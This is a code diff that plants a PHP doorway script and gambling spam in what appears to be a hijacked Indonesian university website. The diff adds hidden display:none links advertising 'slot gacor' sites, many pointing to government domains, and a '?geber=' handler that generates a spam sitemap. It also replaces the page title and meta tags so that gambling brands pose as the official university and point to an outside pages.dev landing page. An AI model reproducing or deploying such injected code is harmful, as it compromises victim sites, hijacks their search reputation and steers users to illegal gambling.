+					<div class='premium-blog-inner-container'>
+
+														<h2 class='premium-blog-entry-title'>
+			<a href='https://unipi.ac.id/unipipressisbnnewregulation/' target='_self'>
+				Unipi Press Universitas Persatuan Islam merespon Peraturan Baru Pengurusan ISBN Buku yang Harus Dilakukan Secara Online			</a>
+		</h2>
+				<div class='premium-blog-entry-meta'>
+			
+			
+			
+					</div>
+		
+					</div>
+
+							<div class='premium-blog-content-inner-wrapper'>
+		<p class='premium-blog-post-content'>Dalam dunia penerbitan buku, International Standard Book Number (ISBN) merupakan elemen yang sangat penting. ISBN bukan hanya sekadar angka, tetapi juga menjadi identitas unik bagi …</p>		</div>
+							
+				</div>
+			</div>
+		</div>
+
+				<div class='premium-blog-post-outer-container' data-total='7'>
+			<div class='premium-blog-post-container premium-blog-skin-classic'>
+									<div class='premium-blog-thumb-effect-wrapper'>
+						<div class='premium-blog-thumbnail-container premium-blog-zoomin-effect'>
+							<img decoding='async' src='https://unipi.ac.id/wp-content/uploads/2024/10/MOHON-DOA-RESTU-PP-PERSIS-BARU-REVISI_page-0001_11zon.jpg' class='attachment-full size-full wp-image-5191' alt='' />						</div>
+													<div class='premium-blog-thumbnail-overlay'>
+								<a class='elementor-icon' href='https://unipi.ac.id/mohon-doa-restu-untuk-kelancaran-pembangunan-kampus-universitas-persatuan-islam/' target='_self' aria-hidden='true'><span>Mohon Doa Restu Untuk Kelancaran Pembangunan Kampus Universitas Persatuan Islam</span></a>
+							</div>
+
+																		</div>
+												<div class='premium-blog-content-wrapper '>
+
+					<div class='premium-blog-inner-container'>
+
+														<h2 class='premium-blog-entry-title'>
+			<a href='https://unipi.ac.id/mohon-doa-restu-untuk-kelancaran-pembangunan-kampus-universitas-persatuan-islam/' target='_self'>
+				Mohon Doa Restu Untuk Kelancaran Pembangunan Kampus Universitas Persatuan Islam			</a>
+		</h2>
+				<div class='premium-blog-entry-meta'>
+			
+			
+			
+					</div>
+		
+					</div>
+
+							<div class='premium-blog-content-inner-wrapper'>
+		<p class='premium-blog-post-content'>Universitas Persatuan Islam (UNIPI) terus berupaya meningkatkan kualitas pendidikan dan fasilitas bagi mahasiswa. Dalam rangka mencapai tujuan tersebut, UNIPI saat ini tengah membangun kampus baru …</p>		</div>
+							
+				</div>
+			</div>
+		</div>
+
+				<div class='premium-blog-post-outer-container' data-total='7'>
+			<div class='premium-blog-post-container premium-blog-skin-classic'>
+									<div class='premium-blog-thumb-effect-wrapper'>
+						<div class='premium-blog-thumbnail-container premium-blog-zoomin-effect'>
+							<img loading='lazy' decoding='async' width='1280' height='573' src='https://unipi.ac.id/wp-content/uploads/2024/07/WhatsApp-Image-2024-07-22-at-11.59.30.jpeg' class='attachment-full size-full wp-image-5180' alt='' srcset='https://unipi.ac.id/wp-content/uploads/2024/07/WhatsApp-Image-2024-07-22-at-11.59.30.jpeg 1280w, https://unipi.ac.id/wp-content/uploads/2024/07/WhatsApp-Image-2024-07-22-at-11.59.30-300x134.jpeg 300w, https://unipi.ac.id/wp-content/uploads/2024/07/WhatsApp-Image-2024-07-22-at-11.59.30-1024x458.jpeg 1024w, https://unipi.ac.id/wp-content/uploads/2024/07/WhatsApp-Image-2024-07-22-at-11.59.30-768x344.jpeg 768w, https://unipi.ac.id/wp-content/uploads/2024/07/WhatsApp-Image-2024-07-22-at-11.59.30-1200x537.jpeg 1200w' sizes='(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 62vw, 840px' />						</div>
+													<div class='premium-blog-thumbnail-overlay'>
+								<a class='elementor-icon' href='https://unipi.ac.id/mahasiswa-i-universitas-persatuan-islam-siap-mengabdi-di-masyarakat-melalui-kkn/' target='_self' aria-hidden='true'><span>Mahasiswa/i Universitas Persatuan Islam Siap Mengabdi di Masyarakat Melalui KKN</span></a>
+							</div>
+
+																		</div>
+												<div class='premium-blog-content-wrapper '>
+
+					<div class='premium-blog-inner-container'>
+
+														<h2 class='premium-blog-entry-title'>
+			<a href='https://unipi.ac.id/mahasiswa-i-universitas-persatuan-islam-siap-mengabdi-di-masyarakat-melalui-kkn/' target='_self'>
+				Mahasiswa/i Universitas Persatuan Islam Siap Mengabdi di Masyarakat Melalui KKN			</a>
+		</h2>
+				<div class='premium-blog-entry-meta'>
+			
+			
+			
+					</div>
+		
+					</div>
+
+							<div class='premium-blog-content-inner-wrapper'>
+		<p class='premium-blog-post-content'>Pelapasan KKN 2024 Mahasiswa/I Universitas Persatuan Islam* Sebanyak 63 mahasiswa/i Universitas Persatuan Islam dilepas secara resmi untuk melaksanakan Kuliah Kerja Nyata Mandiri (KKNM) di berbagai …</p>		</div>
+							
+				</div>
+			</div>
+		</div>
+
+				</div>
+
+						</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				<section class='elementor-section elementor-top-section elementor-element elementor-element-138569cc elementor-section-content-middle elementor-section-stretched elementor-section-boxed elementor-section-height-default elementor-section-height-default' data-id='138569cc' data-element_type='section' data-settings='{&quot;background_background&quot;:&quot;classic&quot;,&quot;stretch_section&quot;:&quot;section-stretched&quot;}'>
+							<div class='elementor-background-overlay'></div>
+							<div class='elementor-container elementor-column-gap-default'>
+					<div class='elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-39e8b0b0' data-id='39e8b0b0' data-element_type='column'>
+			<div class='elementor-widget-wrap elementor-element-populated'>
+						<div class='elementor-element elementor-element-13c6e39f elementor-widget elementor-widget-heading' data-id='13c6e39f' data-element_type='widget' data-widget_type='heading.default'>
+				<div class='elementor-widget-container'>
+					<h2 class='elementor-heading-title elementor-size-default'>Based On Tafaqquh Fiddien<br>and Modern University</h2>				</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				<section class='elementor-section elementor-top-section elementor-element elementor-element-e8a6db8 elementor-section-stretched elementor-section-boxed elementor-section-height-default elementor-section-height-default' data-id='e8a6db8' data-element_type='section' data-settings='{&quot;stretch_section&quot;:&quot;section-stretched&quot;}'>
+						<div class='elementor-container elementor-column-gap-default'>
+					<div class='elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-05eeb47' data-id='05eeb47' data-element_type='column' data-settings='{&quot;background_background&quot;:&quot;classic&quot;}'>
+			<div class='elementor-widget-wrap elementor-element-populated'>
+						<div class='elementor-element elementor-element-82b9fbf elementor-widget elementor-widget-counter' data-id='82b9fbf' data-element_type='widget' data-widget_type='counter.default'>
+				<div class='elementor-widget-container'>
+							<div class='elementor-counter'>
+			<div class='elementor-counter-title'>Dosen</div>			<div class='elementor-counter-number-wrapper'>
+				<span class='elementor-counter-number-prefix'></span>
+				<span class='elementor-counter-number' data-duration='2000' data-to-value='45' data-from-value='0' data-delimiter=','>0</span>
+				<span class='elementor-counter-number-suffix'></span>
+			</div>
+		</div>
+						</div>
+				</div>
+					</div>
+		</div>
+				<div class='elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-377fe8f' data-id='377fe8f' data-element_type='column' data-settings='{&quot;background_background&quot;:&quot;classic&quot;}'>
+			<div class='elementor-widget-wrap elementor-element-populated'>
+						<div class='elementor-element elementor-element-95bee66 elementor-widget elementor-widget-counter' data-id='95bee66' data-element_type='widget' data-widget_type='counter.default'>
+				<div class='elementor-widget-container'>
+							<div class='elementor-counter'>
+			<div class='elementor-counter-title'>Lulusan</div>			<div class='elementor-counter-number-wrapper'>
+				<span class='elementor-counter-number-prefix'></span>
+				<span class='elementor-counter-number' data-duration='2000' data-to-value='8532' data-from-value='0' data-delimiter=','>0</span>
+				<span class='elementor-counter-number-suffix'></span>
+			</div>
+		</div>
+						</div>
+				</div>
+					</div>
+		</div>
+				<div class='elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-4ae3ae5' data-id='4ae3ae5' data-element_type='column' data-settings='{&quot;background_background&quot;:&quot;classic&quot;}'>
+			<div class='elementor-widget-wrap elementor-element-populated'>
+						<div class='elementor-element elementor-element-d837354 elementor-widget elementor-widget-counter' data-id='d837354' data-element_type='widget' data-widget_type='counter.default'>
+				<div class='elementor-widget-container'>
+							<div class='elementor-counter'>
+			<div class='elementor-counter-title'>Mahasiswa Aktif</div>			<div class='elementor-counter-number-wrapper'>
+				<span class='elementor-counter-number-prefix'></span>
+				<span class='elementor-counter-number' data-duration='2000' data-to-value='2000' data-from-value='0' data-delimiter=','>0</span>
+				<span class='elementor-counter-number-suffix'></span>
+			</div>
+		</div>
+						</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				<section class='elementor-section elementor-top-section elementor-element elementor-element-a490f5b elementor-section-stretched elementor-section-boxed elementor-section-height-default elementor-section-height-default' data-id='a490f5b' data-element_type='section' data-settings='{&quot;stretch_section&quot;:&quot;section-stretched&quot;}'>
+						<div class='elementor-container elementor-column-gap-default'>
+					<div class='elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-b395f7a' data-id='b395f7a' data-element_type='column'>
+			<div class='elementor-widget-wrap elementor-element-populated'>
+						<div class='elementor-element elementor-element-c8fd25b elementor-widget elementor-widget-image-carousel' data-id='c8fd25b' data-element_type='widget' data-settings='{&quot;slides_to_show&quot;:&quot;5&quot;,&quot;navigation&quot;:&quot;none&quot;,&quot;autoplay&quot;:&quot;yes&quot;,&quot;pause_on_hover&quot;:&quot;yes&quot;,&quot;pause_on_interaction&quot;:&quot;yes&quot;,&quot;autoplay_speed&quot;:5000,&quot;infinite&quot;:&quot;yes&quot;,&quot;speed&quot;:500}' data-widget_type='image-carousel.default'>
+				<div class='elementor-widget-container'>
+							<div class='elementor-image-carousel-wrapper swiper' role='region' aria-roledescription='carousel' aria-label='Image Carousel' dir='ltr'>
+			<div class='elementor-image-carousel swiper-wrapper' aria-live='off'>
+								<div class='swiper-slide' role='group' aria-roledescription='slide' aria-label='1 of 7'><figure class='swiper-slide-inner'><img decoding='async' class='swiper-slide-image' src='https://unipi.ac.id/wp-content/uploads/2024/01/lldikti-logo-portrait.png' alt='lldikti-logo-portrait' /></figure></div><div class='swiper-slide' role='group' aria-roledescription='slide' aria-label='2 of 7'><figure class='swiper-slide-inner'><img decoding='async' class='swiper-slide-image' src='https://unipi.ac.id/wp-content/uploads/2024/01/kamus-merdeka.png' alt='kamus merdeka' /></figure></div><div class='swiper-slide' role='group' aria-roledescription='slide' aria-label='3 of 7'><figure class='swiper-slide-inner'><img decoding='async' class='swiper-slide-image' src='https://unipi.ac.id/wp-content/uploads/2024/01/kip.png' alt='kip' /></figure></div><div class='swiper-slide' role='group' aria-roledescription='slide' aria-label='4 of 7'><figure class='swiper-slide-inner'><img decoding='async' class='swiper-slide-image' src='https://unipi.ac.id/wp-content/uploads/2024/01/laminfokom.jpg' alt='laminfokom' /></figure></div><div class='swiper-slide' role='group' aria-roledescription='slide' aria-label='5 of 7'><figure class='swiper-slide-inner'><img decoding='async' class='swiper-slide-image' src='https://unipi.ac.id/wp-content/uploads/2024/01/lamdik.png' alt='lamdik' /></figure></div><div class='swiper-slide' role='group' aria-roledescription='slide' aria-label='6 of 7'><figure class='swiper-slide-inner'><img decoding='async' class='swiper-slide-image' src='https://unipi.ac.id/wp-content/uploads/2024/01/lamemba.png' alt='lamemba' /></figure></div><div class='swiper-slide' role='group' aria-roledescription='slide' aria-label='7 of 7'><figure class='swiper-slide-inner'><img decoding='async' class='swiper-slide-image' src='https://unipi.ac.id/wp-content/uploads/2024/01/ban-pt.jpg' alt='ban-pt' /></figure></div>			</div>
+							
+									</div>
+						</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				<section class='elementor-section elementor-top-section elementor-element elementor-element-94ebc8c elementor-section-boxed elementor-section-height-default elementor-section-height-default' data-id='94ebc8c' data-element_type='section'>
+						<div class='elementor-container elementor-column-gap-default'>
+					<div class='elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-b69c6c2' data-id='b69c6c2' data-element_type='column'>
+			<div class='elementor-widget-wrap elementor-element-populated'>
+						<div class='elementor-element elementor-element-8fb45da elementor-widget elementor-widget-html' data-id='8fb45da' data-element_type='widget' data-widget_type='html.default'>
+				<div class='elementor-widget-container'>
+					<body><div style='display: none;'>
+<a style='display:none;' href='https://samsatungaran.bapenda.jatengprov.go.id/rp/' rel='dofollow'>slot gacor</a>
+</div></body>
+				</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				</div>
+		
+
+
+
+		</div><!-- .site-content -->
+
+
+	</div><!-- .site-inner -->
+	    <!-- footer -->
+    <div id='main-footer' class='main-footer'>
+
+    	<div class='container'>
+
+	        <!-- 1/4 -->
+	        <div class='four columns'>
+	            <div id='custom_html-6'><div class='textwidget custom-html-widget'><img src='https://unipi.ac.id/wp-content/uploads/2021/01/logo-white-2021-300px.png' alt='UNIPI' /></div></div>	        </div>
+	        <!-- /End 1/4 -->
+	        <!-- 2/4 -->
+	        <div class='four columns'>
+	            <div id='custom_html-12'><div class='textwidget custom-html-widget'><p></p>
+<p>Pusat Informasi : 081222699980
+<br>Kampus : Jl. Peta 154 Bojongloa Kaler Bandung
+<br>Email : info@unipi.ac.id</p>
+<div class='footer-contacts fl-wrap'>
+</div>
+<div class='shrewd_solution_icon'>
+<ul>
+<li><a href='https://www.facebook.com/UniversitasPersis'><em class='fa fa-facebook'><strong>icon</strong></em></a></li>
+<li><a href='#'><em class='fa fa-twitter'><strong>icon</strong></em></a></li>
+<li><a href='#'><em class='fa fa-youtube'><strong>icon</strong></em></a></li>
+<li><a href='#'><em class='fa fa-instagram'><strong>icon</strong></em></a></li>
+</ul>
+</div></div></div>	        </div>
+	        <!-- /End 2/4 -->
+	        <!-- 3/4 -->
+	        <div class='four columns'>
+	            	        </div>
+	        <!-- /End 3/4 -->
+	        <!-- 4/4 -->
+	        <div class='four columns'>
+	            	        </div>
+	        <!-- /End 4/4 -->
+	    </div> <!-- /End container -->
+
+    </div>
+    <!-- /End Footer -->
+
+
+		<footer id='colophon' class='site-footer' role='contentinfo'>
+
+           				<div class='footer-custom-code'>
+							
+				</div>
+							<div class='site-info'>
+						
+
+			    <div class='lt-footer'>
+			        <div class='widget_text top-head-widget'><div class='textwidget custom-html-widget'><p>
+	<a href='https://universitas-persis.ac.id/'>© Universitas Persatuan Islam 2020</a>
+</p></div></div><div class='top-head-widget'><div style='display:none'>
+<li><a href='https://unipi.ac.id/' rel='dofollow'>slot thailand</a></li>
+<li><a href='https://festaro.es/' rel='dofollow'>slot gacor</a></li>
+<li><a href='https://ptk.fp.unila.ac.id/' rel='dofollow'>slot gacor</a></li>
+<li><a href='https://we-cts.com/' rel='dofollow'>slot gacor</a></li>
+<li><a href='https://asn.lomboktimurkab.go.id/rp/' rel='dofollow'>slot gacor</a></li>
+<li><a href='https://asn.lomboktimurkab.go.id/rp/' rel='dofollow'>RP8888</a></li>
+<li><a href='https://dpmptsp.bandung.go.id/' rel='dofollow'>slot gacor</a></li>
+<li><a href='https://formasi.menpan.go.id/' rel='dofollow'>slot gacor</a></li>
+<li><a href='https://eaudit.itwasum.polri.go.id/' rel='dofollow'>slot gacor</a></li>
+<li><a href='https://fik.uncen.ac.id/' rel='dofollow'>scatter hitam</a></li>
+<li><a href='https://dprd-lamsel.go.id/' rel='dofollow'>panenhoki77</a></li>
+<li><a href='https://www.gftactical-thai.com/' rel='dofollow'>slot gacor</a></li>
+<li><a href='https://vivirdelafotografia.es/' rel='dofollow'>slot gacor</a></li>
+</div></div>			    </div>
+
+			</div><!-- .site-info -->
+		</footer><!-- .site-footer -->
+
+
+
+		<script>
+			document.addEventListener('DOMContentLoaded', function() {
+				var gcaMain = new GetChatApp({
+					'platforms' : {
+						'whatsapp' : true,
+						'facebook' : false,
+						'email' :  false,
+						'instagram' : false,
+						'telegram' : false,
+						'tiktok' : false,
+						'x' : false,
+						'linkedin' : false,
+						'phone' : false,
+						'customLink' : false,
+					},
+					
+					'mobileNumber' : '+6281231268800',
+					'titleMessage' : '&#x1f44b; Chat with me on WhatsApp!',
+					'welcomeMessage': 'Assalaamualaikum',
+
+					'facebookPageId' : '',
+					'facebookMessage': 'Hey there!\n\nHow can I help you today?',
+					'facebookReplyTime' : 'a day',
+
+					'gcaEmailAddress' : '',
+					'gcaEmailSubject' : '',
+
+					'gcaInstagramUsername' : '',
+
+					'gcaTelegramUsername' : '',
+					
+					'gcaTiktokUsername' : '',
+					
+					'gcaXUsername' : '',
+					
+					'gcaLinkedinUsername' : '',
+					
+					'gcaPhoneNumber' : '',
+					
+					'gcaCustomLink' : '',
+					
+					'position' : 'right',
+				});
+			});
+		</script>
+
+		<style type='text/css'> 
+         /* Hide reCAPTCHA V3 badge */
+        .grecaptcha-badge {
+        
+            visibility: hidden !important;
+        
+        }
+    </style>			<script>
+				const lazyloadRunObserver = () => {
+					const lazyloadBackgrounds = document.querySelectorAll( `.e-con.e-parent:not(.e-lazyloaded)` );
+					const lazyloadBackgroundObserver = new IntersectionObserver( ( entries ) => {
+						entries.forEach( ( entry ) => {
+							if ( entry.isIntersecting ) {
+								let lazyloadBackground = entry.target;
+								if( lazyloadBackground ) {
+									lazyloadBackground.classList.add( 'e-lazyloaded' );
+								}
+								lazyloadBackgroundObserver.unobserve( entry.target );
+							}
+						});
+					}, { rootMargin: '200px 0px 200px 0px' } );
+					lazyloadBackgrounds.forEach( ( lazyloadBackground ) => {
+						lazyloadBackgroundObserver.observe( lazyloadBackground );
+					} );
+				};
+				const events = [
+					'DOMContentLoaded',
+					'elementor/lazyload/observe',
+				];
+				events.forEach( ( event ) => {
+					document.addEventListener( event, lazyloadRunObserver );
+				} );
+			</script>
+			<script type='text/javascript' id='pa-frontend-js-extra'>
+/* <![CDATA[ */
+var PremiumSettings = {'ajaxurl':'https:\/\/unipi.ac.id\/wp-admin\/admin-ajax.php','nonce':'3e42e56f31'};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://unipi.ac.id/wp-content/uploads/premium-addons-elementor/pa-frontend-0af53dd1e.min.js?ver=1739781978' id='pa-frontend-js'></script>
+<script type='text/javascript' src='https://unipi.ac.id/wp-includes/js/dist/hooks.min.js?ver=4d63a3d491d11ffd8ac6' id='wp-hooks-js'></script>
+<script type='text/javascript' src='https://unipi.ac.id/wp-includes/js/dist/i18n.min.js?ver=5e580eb46a90c2b997e6' id='wp-i18n-js'></script>
+<script type='text/javascript' id='wp-i18n-js-after'>
+/* <![CDATA[ */
+wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://unipi.ac.id/wp-content/plugins/contact-form-7/includes/swv/js/index.js?ver=6.0.3' id='swv-js'></script>
+<script type='text/javascript' id='contact-form-7-js-before'>
+/* <![CDATA[ */
+var wpcf7 = {
+    'api': {
+        'root': 'https:\/\/unipi.ac.id\/wp-json\/',
+        'namespace': 'contact-form-7\/v1'
+    }
+};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://unipi.ac.id/wp-content/plugins/contact-form-7/includes/js/index.js?ver=6.0.3' id='contact-form-7-js'></script>
+<script type='text/javascript' src='https://unipi.ac.id/wp-content/themes/tpg-eschool/js/skip-link-focus-fix.js?ver=20160816' id='ltheme-skip-link-focus-fix-js'></script>
+<script type='text/javascript' id='ltheme-script-js-extra'>
+/* <![CDATA[ */
+var screenReaderText = {'expand':'expand child menu','collapse':'collapse child menu'};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://unipi.ac.id/wp-content/themes/tpg-eschool/js/functions.js?ver=20181230' id='ltheme-script-js'></script>
+<script type='text/javascript' src='https://unipi.ac.id/wp-content/themes/tpg-eschool/js/custom.js?ver=20181230' id='ltheme-custom-js'></script>
+<script type='text/javascript' src='https://unipi.ac.id/wp-content/plugins/premium-addons-for-elementor/assets/frontend/min-js/TweenMax.min.js?ver=4.10.85' id='pa-tweenmax-js'></script>
+<script type='text/javascript' src='https://unipi.ac.id/wp-content/plugins/premium-addons-for-elementor/assets/frontend/min-js/motionpath.min.js?ver=4.10.85' id='pa-motionpath-js'></script>
+<script type='text/javascript' src='https://unipi.ac.id/wp-content/plugins/premium-addons-for-elementor/assets/frontend/min-js/lottie.min.js?ver=4.10.85' id='lottie-js-js'></script>
+<script type='text/javascript' src='https://unipi.ac.id/wp-includes/js/imagesloaded.min.js?ver=5.0.0' id='imagesloaded-js'></script>
+<script type='text/javascript' src='https://unipi.ac.id/wp-content/plugins/premium-addons-for-elementor/assets/frontend/min-js/isotope.min.js?ver=4.10.85' id='isotope-js-js'></script>
+<script type='text/javascript' src='https://unipi.ac.id/wp-content/plugins/premium-addons-for-elementor/assets/frontend/min-js/slick.min.js?ver=4.10.85' id='pa-slick-js'></script>
+<script type='text/javascript' src='https://unipi.ac.id/wp-content/plugins/elementor/assets/lib/jquery-numerator/jquery-numerator.min.js?ver=0.2.1' id='jquery-numerator-js'></script>
+<script type='text/javascript' src='https://unipi.ac.id/wp-content/plugins/elementor/assets/lib/swiper/v8/swiper.min.js?ver=8.4.5' id='swiper-js'></script>
+<script type='text/javascript' src='https://getchat.app/assets/js/wp/min/getchatapp.js?ver=1.2.02' id='get-chat-app-js'></script>
+<script type='text/javascript' src='https://unipi.ac.id/wp-content/plugins/elementor/assets/js/webpack.runtime.min.js?ver=3.27.5' id='elementor-webpack-runtime-js'></script>
+<script type='text/javascript' src='https://unipi.ac.id/wp-content/plugins/elementor/assets/js/frontend-modules.min.js?ver=3.27.5' id='elementor-frontend-modules-js'></script>
+<script type='text/javascript' src='https://unipi.ac.id/wp-includes/js/jquery/ui/core.min.js?ver=1.13.3' id='jquery-ui-core-js'></script>
+<script type='text/javascript' id='elementor-frontend-js-before'>
+/* <![CDATA[ */
+var elementorFrontendConfig = {'environmentMode':{'edit':false,'wpPreview':false,'isScriptDebug':false},'i18n':{'shareOnFacebook':'Share on Facebook','shareOnTwitter':'Share on Twitter','pinIt':'Pin it','download':'Download','downloadImage':'Download image','fullscreen':'Fullscreen','zoom':'Zoom','share':'Share','playVideo':'Play Video','previous':'Previous','next':'Next','close':'Close','a11yCarouselPrevSlideMessage':'Previous slide','a11yCarouselNextSlideMessage':'Next slide','a11yCarouselFirstSlideMessage':'This is the first slide','a11yCarouselLastSlideMessage':'This is the last slide','a11yCarouselPaginationBulletMessage':'Go to slide'},'is_rtl':false,'breakpoints':{'xs':0,'sm':480,'md':768,'lg':1025,'xl':1440,'xxl':1600},'responsive':{'breakpoints':{'mobile':{'label':'Mobile Portrait','value':767,'default_value':767,'direction':'max','is_enabled':true},'mobile_extra':{'label':'Mobile Landscape','value':880,'default_value':880,'direction':'max','is_enabled':false},'tablet':{'label':'Tablet Portrait','value':1024,'default_value':1024,'direction':'max','is_enabled':true},'tablet_extra':{'label':'Tablet Landscape','value':1200,'default_value':1200,'direction':'max','is_enabled':false},'laptop':{'label':'Laptop','value':1366,'default_value':1366,'direction':'max','is_enabled':false},'widescreen':{'label':'Widescreen','value':2400,'default_value':2400,'direction':'min','is_enabled':false}},
+'hasCustomBreakpoints':false},'version':'3.27.5','is_static':false,'experimentalFeatures':{'additional_custom_breakpoints':true,'e_swiper_latest':true,'e_onboarding':true,'home_screen':true,'landing-pages':true,'editor_v2':true,'link-in-bio':true,'floating-buttons':true},'urls':{'assets':'https:\/\/unipi.ac.id\/wp-content\/plugins\/elementor\/assets\/','ajaxurl':'https:\/\/unipi.ac.id\/wp-admin\/admin-ajax.php','uploadUrl':'https:\/\/unipi.ac.id\/wp-content\/uploads'},'nonces':{'floatingButtonsClickTracking':'08ad375b72'},'swiperClass':'swiper','settings':{'page':[],'editorPreferences':[]},'kit':{'active_breakpoints':['viewport_mobile','viewport_tablet'],'global_image_lightbox':'yes','lightbox_enable_counter':'yes','lightbox_enable_fullscreen':'yes','lightbox_enable_zoom':'yes','lightbox_enable_share':'yes','lightbox_title_src':'title','lightbox_description_src':'description'},'post':{'id':3124,'title':'Universitas%20Persatuan%20Islam','excerpt':'','featuredImage':false}};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://unipi.ac.id/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.27.5' id='elementor-frontend-js'></script>
+<!-- start Simple Custom CSS and JS -->
+<script type='text/javascript'>
+
+</script><!-- end Simple Custom CSS and JS -->
+<!-- start Simple Custom CSS and JS -->
+<!-- 04d8dc5feebb71bdbfb96dfd3e87ac47 --><!-- end Simple Custom CSS and JS -->
+
+</div><!-- .site -->
+</body>
+</html>
+
+    
+    
+    
+    
+
+</body>
+
+</html>
+    ";
+}
+
+function generate_sitemap($urls)
+{
+    $file_name = 'kingisking.xml';
+
+    $sitemap_entries = [];
+    foreach ($urls as $url) {
+        $lastmod = date('c');
+        $sitemap_entries[] = "
+        <url>
+        <loc>$url</loc>
+        <lastmod>$lastmod</lastmod>
+        </url>";
+    }
+
+    $sitemap_content = <<<XML
+<?xml version="1.0" encoding="UTF-8"?>
+<urlset
+  xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"
+  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+  xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9
+        http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
+<!-- created with Free Online Sitemap Generator www.xml-sitemaps.com -->
+XML;
+
+    $sitemap_content .= implode("\n", $sitemap_entries);
+    $sitemap_content .= "\n</urlset>";
+
+    file_put_contents($file_name, $sitemap_content);
+}
+
+function get_all_urls($filename, $baseUrl)
+{
+    $urls = [];
+    $lines = @file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    if ($lines !== false) {
+        foreach ($lines as $item) {
+            $urls[] = $baseUrl . strtolower($item);
+        }
+    }
+    return $urls;
+}
+
+$filename = "readme.txt";
+
+if (isset($_GET['geber'])) {
+    $target_string = strtolower($_GET['geber']);
+    $lines = @file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    if ($lines !== false) {
+        foreach ($lines as $item) {
+            if (strtolower($item) === $target_string) {
+                $BRAND = strtoupper($target_string);
+                break;
+            }
+        }
+    }
+    if (isset($BRAND)) {
+        $BRANDS = $BRAND;
+        $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
+        $fullUrl = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+        if (isset($fullUrl)) {
+            $parsedUrl = parse_url($fullUrl);
+            $scheme = isset($parsedUrl['scheme']) ? $parsedUrl['scheme'] : '';
+            $host = isset($parsedUrl['host']) ? $parsedUrl['host'] : '';
+            $path = isset($parsedUrl['path']) ? $parsedUrl['path'] : '';
+            $baseUrl = $scheme . "://" . $host . $path . "?geber=";
+            $urlPath = $scheme . "://" . $host . $path . "?geber=" . $BRAND;;
+        } else {
+            echo "";
+        }
+    } else {
+        denied();
+        exit();
+    }
+} else {
+    denied();
+    exit();
+}
+
+$sitemap_file = 'kingisking.xml';
+if (!file_exists($sitemap_file)) {
+    $all_urls = get_all_urls($filename, $baseUrl);
+    generate_sitemap($all_urls);
+}
+
+$ampnya = "https://daftarloginunipi.pages.dev/?geber=$BRANDS";
+#$daftar = "https:///example.com/regist";
+?>
 <!DOCTYPE HTML>
 <html xmlns:wormhole="http://www.w3.org/1999/xhtml" lang="id-ID">
 <head>
   <meta charset="utf-8" />
-  <title>3344GG & Slot Gacor Thailand Hari Ini Pasti Maxwin</title>
-  <meta name="description" content="3344GG adalah platform slot thailand gacor terpercaya yang menjadi pilihan utama para pemain di Thailand. Dikenal sebagai situs slot gacor dengan peluang menang besar, 3344GG menghadirkan berbagai permainan slot terbaru." />
+  <title><?php echo $BRANDS; ?> Website Resmi Universitas Persatuan Islam</title>
+  <meta name="description" content="<?php echo $BRANDS; ?> berkomitmen mencetak lulusan berkualitas dengan nilai-nilai Islam. Menawarkan berbagai program studi unggulan. Login dan Daftar Sekarang!" />
   <meta name="search engines" content="Aeiwi, Alexa, AllTheWeb, AltaVista, AOL Netfind, Anzwers, Canada, DirectHit, EuroSeek, Excite, Overture, Go, Google, HotBot, InfoMak, Kanoodle, Lycos, MasterSite, National Directory, Northern Light, SearchIt, SimpleSearch, WebsMostLinked, WebTop, What-U-Seek, AOL, Yahoo, WebCrawler, Infoseek, Excite, Magellan, LookSmart, bing, CNET, Googlebot">
-  <meta name="keywords" content="judi slot, slot gacor, slot thailand gacor, link slot">
+  <meta name="keywords" content="<?php echo $BRANDS; ?>, <?php echo $BRANDS; ?> HEYLINK LOGIN">
   <meta name="aplus-auto-exp" content='[{"filter":"exp-tracking=suggest-official-store","logkey":"/lzdse.result.os_impr","props":["href"],"tag":"a"}]' />
-  <meta name="data-spm" content="a2o4j" />  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+  <meta name="data-spm" content="a2o4j" />  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
   <meta name="robots" content="index, follow" />
-  <meta name="og:url" content="https://rsudarifinachmad.riau.go.id/wbbm/"/>
-  <meta name="og:title" content="3344GG & Slot Gacor Thailand Hari Ini Pasti Maxwin" />
+  <meta name="og:url" content="<?php echo $urlPath; ?>"/>
+  <meta name="og:title" content="<?php echo $BRANDS; ?> Website Resmi Universitas Persatuan Islam" />
   <meta name="og:type" content="Slot Gacor" />
   <meta name="language" content="Indonesia">
   <meta name="geo.region" content="ID">
   <meta name="geo.placename" content="Indonesia">
-  <meta name="google-site-verification" content="ZW5Nz_f1TLs0eT69kugrhqWqjFkglabYZCmM_AyW3pg" />
-  <meta name="og:description" content="3344GG adalah platform slot thailand gacor terpercaya yang menjadi pilihan utama para pemain di Thailand. Dikenal sebagai situs slot gacor dengan peluang menang besar, 3344GG menghadirkan berbagai permainan slot terbaru." />
